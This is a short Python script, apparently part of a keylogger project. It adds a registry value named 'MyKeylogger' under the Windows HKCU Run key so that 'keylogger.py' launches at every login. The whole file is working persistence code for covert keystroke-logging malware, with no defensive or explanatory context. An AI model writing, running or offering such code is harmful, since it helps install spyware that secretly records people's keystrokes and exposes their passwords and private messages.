import os
import winreg as reg

def add_to_startup(file_path):
    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'

    open_reg = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_reg, 'MyKeylogger', 0, reg.REG_SZ, file_path)
    reg.CloseKey(open_reg)

add_to_startup(os.path.abspath("keylogger.py"))
